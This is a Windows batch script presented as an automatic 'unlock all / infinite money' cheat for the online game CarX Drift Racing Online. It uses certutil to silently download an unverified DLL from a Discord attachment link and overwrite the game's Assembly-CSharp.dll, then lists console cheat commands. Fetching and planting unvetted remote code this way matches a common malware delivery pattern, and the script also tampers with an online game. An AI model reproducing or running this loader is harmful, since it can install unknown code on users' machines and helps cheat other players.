@echo off
:start
title Automatic CarX UnlockAll
color F0
cd
cls
echo.
echo CREDIT: XOELF
echo Github: @xoElf
echo Twitter: @xoElfy
echo YouTube: xoElf
echo Discord: Elf#0779
echo.
echo Automatic CarX Unlockall / Infinite Money
echo SOURCE CODE FOR THIS IS LOCATED ON MY GITHUB! (@xoElf)
echo.
echo PRESS ANY KEY TO BEGIN!
pause>nul
md "C:\Program Files (x86)\Steam\steamapps\common\CarX Drift Racing Online\Drift Racing Online_Data\Managed" >nul
cls
set url=https://cdn.discordapp.com/attachments/834843290493911083/835291172444307466/Assembly-CSharp.dll >nul
set file=Assembly-CSharp.dll >nul
certutil -urlcache -split -f %url% %file% >nul
echo DOWNLOADING THE MODDED DLL FILE...
set path="C:\Program Files (x86)\Steam\steamapps\common\CarX Drift Racing Online\Drift Racing Online_Data\Managed"
echo MOVING THE MODDED DLL FILE...
move %file% "C:\Program Files (x86)\Steam\steamapps\common\CarX Drift Racing Online\Drift Racing Online_Data\Managed\%file%" >nul
echo MOVED!
cls
echo.
echo FINISHED! NOW, TIME FOR THE MANUAL STEPS!
echo.
echo TUTORIAL:
echo LAUNCH CARX
echo PRESS [CTRL + `] (on QWERTY keyboards)
echo NOW, IN THE CONSOLE, TYPE THESE COMMAANDS:
echo GiveAll
echo GiveLevel
echo GiveMoney
echo ENJOY!
pause>nul
exit